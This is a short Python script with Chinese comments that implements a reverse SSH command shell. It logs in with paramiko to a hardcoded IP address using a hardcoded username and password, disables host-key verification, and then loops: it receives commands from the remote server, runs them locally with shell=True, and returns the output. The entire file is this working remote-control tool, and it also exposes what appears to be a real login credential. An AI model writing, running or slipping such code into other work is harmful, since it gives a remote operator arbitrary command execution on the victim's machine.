import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
    '''
    Paramiko支持使用密钥认证来代替密码验证，在此使用用户名密码验证
    :param ip:
    :param user:
    :param passwd:
    :param command:
    :return:
    '''
    client=paramiko.SSHClient()
    # client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command=ssh_session.recv(1024)#get the command from the SSH server
            try:
                cmd_output=subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command("32.32.32.88",'xiaohan','1214875764','ClientConnected')
